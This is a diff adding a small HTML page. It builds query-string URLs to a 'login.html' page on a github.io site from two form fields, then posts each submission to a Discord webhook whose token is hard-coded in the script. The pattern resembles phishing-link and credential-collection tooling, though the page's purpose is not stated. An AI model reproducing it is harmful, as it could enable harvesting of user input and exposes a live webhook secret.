@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en-GB" style="font-size: 100%; --saturation-factor: 1; --devtools-sidebar-width: 0px;">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Generate URL and Send to Discord</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    input, button {
+      margin: 10px 0;
+      padding: 10px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Enter Text and Generate URL</h2>
+
+  <form id="urlForm">
+    <label for="field1">Field 1:</label>
+    <input type="text" id="field1" name="field1" required>
+    <br><br>
+    <label for="field2">Field 2:</label>
+    <input type="text" id="field2" name="field2" required>
+    <br><br>
+    <button type="submit">Generate URL & Send to Discord</button>
+  </form>
+
+  <h3>Generated URL:</h3>
+  <p id="generatedURL"></p>
+
+  <script>
+    document.getElementById("urlForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // Prevent form submission
+
+      // Get input values
+      const field1 = encodeURIComponent(document.getElementById("field1").value);
+      const field2 = encodeURIComponent(document.getElementById("field2").value);
+
+      // Construct the URL with query parameters
+      const baseUrl = "https://RelMis.github.io/OSTools/login.html";
+      const generatedUrl = `${baseUrl}?field1=${field1}&field2=${field2}`;
+
+      // Display the generated URL
+      document.getElementById("generatedURL").textContent = generatedUrl;
+
+      // Send the URL to Discord webhook
+      sendToDiscord(generatedUrl, field1, field2);
+    });
+
+    function sendToDiscord(generatedUrl, field1, field2) {
+      const webhookURL = "https://discord.com/api/webhooks/1356633610689577051/umEB1wQujJs8tcDuWBzlDU_0zlnk83-710P_4-UMPWg0XQn9XLxL9FFNkRr0Nw_Vi9lt";  // Replace with your Discord webhook URL
+      const payload = {
+        content: `New submission:\nGenerated URL: ${generatedUrl}\nField 1: ${field1}\nField 2: ${field2}`
+      };
+
+      // Send the data to the Discord webhook
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log("Message sent to Discord successfully.");
+        } else {
+          console.error("Error sending message to Discord:", response.statusText);
+        }
+      })
+      .catch(error => {
+        console.error("Error sending to Discord:", error);
+      });
+    }
+  </script>
+
+</body>
+</html>
